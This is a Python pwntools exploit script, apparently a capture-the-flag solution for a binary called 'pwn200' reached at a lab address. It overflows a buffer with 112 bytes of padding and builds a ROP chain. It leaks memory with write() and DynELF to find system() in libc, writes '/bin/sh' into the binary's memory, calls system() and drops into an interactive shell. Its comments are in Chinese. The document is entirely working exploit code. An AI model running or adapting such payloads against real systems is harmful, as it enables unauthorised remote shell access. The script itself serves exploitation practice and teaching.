#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.2", 10001)
elf = ELF("pwn200")

write_addr = elf.symbols['write']
read_addr = elf.symbols['read']
start_addr = 0x080483d0     
binsh_addr = 0x0804a020    
pppr_addr = 0x0804856c

def leak(addr):
	io.recvline()				#读走之前的数据，防止待泄露的数据被污染
	payload = "A"*112			#padding
	payload += p32(write_addr)	#调用write函数
	payload += p32(pppr_addr)	#返回到三个pop，清除栈上write函数的参数
	payload += p32(1)			#fd = STDOUT
	payload += p32(addr)		#buf = addr
	payload += p32(4)			#size = 4
	payload += p32(start_addr)	#返回到start恢复栈
	io.send(payload)
	content = io.recv(4)
	print "%#x => %s" % (addr, (content or '').encode('hex'))
	return content

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)

payload = "A"*112				#padding
payload += p32(read_addr)		#调用read函数读取字符串"/bin/sh"
payload += p32(pppr_addr)		#返回到三个pop，清除栈上read函数的参数
payload += p32(0)				#fd = STDIN
payload += p32(binsh_addr)		#buf = 字符串"/bin/sh"要保存的地址
payload += p32(8)				#size = 8，读取"/bin/sh\x00"共8字节
payload += p32(system_addr)		#返回到函数system，调用system("/bin/sh")
payload += p32(0)				#system函数返回的地址，随便填
payload += p32(binsh_addr)		#&("/bin/sh")
io.send(payload)
io.send('/bin/sh\x00')
io.interactive()